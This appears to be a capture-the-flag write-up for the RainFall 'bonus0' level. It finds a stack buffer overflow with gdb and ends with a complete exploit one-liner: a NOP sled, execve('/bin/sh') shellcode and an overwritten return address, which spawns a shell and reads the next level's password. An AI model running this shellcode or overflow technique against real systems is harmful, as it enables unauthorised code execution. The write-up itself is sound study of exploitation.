# bonus 00

The program wait for two input, and print them concatenated by a space :

```bash
bonus0@RainFall:~$ ./bonus0 
 - 
qwerty
 - 
qwerty
qwerty qwerty
```

By looking at the code, we can see that there are two read function executed. Each buffer read from the stdin is truncated to 20 bytes. They are then concatened with a strcpy first, and a strcat.

By simply passing two input of 20 bytes length, the program segfault:

```bash
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
BBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

By looking after the function `pp`, we can see that there are 4 four random bytes copied before the space :

```bash
Breakpoint 3, 0x080485bd in main ()
(gdb) x/24wx $eax
0xbffff6d6:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6e6:     0x41414141      0x42424242      0x42424242      0x42424242
0xbffff6f6:     0x42424242      0x42424242      0xb7fd0ff4      0x42424220
0xbffff706:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff716:     0xfd0ff442      0xc85800b7      0x0000b7fd      0xf71c0000
0xbffff726:     0xf7acbfff      0x0000bfff      0x824c0000      0x0ff40804
(gdb) x $ebp
0xbffff708:     0x42424242
(gdb) x $ebp+4
0xbffff70c:     0x42424242
(gdb) p/d 0xbffff70c-0xbffff6d6
$3 = 54
```

`eip` is 54 bytes from the beginning of the buffer. We have five bytes between the 40 first and the last 20. So we need to put bytes at 10th position of the second buffer to overwrite `eip` :

```bash
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
BBBBBBBBBCCCCBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBCCCCBBBBBBB��� BBBBBBBBBCCCCBBBBBBB���

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

Then, we need to execute a shellcode. For this, we will put it in the read buffer that contains 4096 bytes. We will write many `\x90` because we have seen that the program contains a stack protection that randomized stack addresses. So we run the program in `gdb` with `set exec-wrapper env -u LINES -u COLUMNS` to avoid to many differences between addresses in `gdb` and in a real environnment.

We first set a breakpoint after a read call to see the beginning of the buffer address and calcute the address 200 bytes after:

```bash
Breakpoint 1, 0x080484e6 in p ()
(gdb) x/3wx $esp
0xbfffe650:     0x00000000      0xbfffe660      0x00001000
(gdb) x/24wxx 0xbfffe660
0xbfffe660:     0x42424242      0x42424242      0x43434342      0x42424243
0xbfffe670:     0x42424242      0x0000000a      0x00000000      0x00000000
0xbfffe680:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe690:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe6a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfffe6b0:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) x/x 0xbfffe660 + 220
0xbfffe73c:     0x00000000
```

We can now try to exploit the program:

```bash
bonus0@RainFall:~$ (python -c 'print "\x41" * 20 + "\x90" * 400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "\x42" * 9 + "\x28\xe7\xff\xbf" + "\x42" * 7';cat) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBB(���BBBBBBB��� BBBBBBBBB(���BBBBBBB���
whoami
bonus1
cd /home/user/bonus1
cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
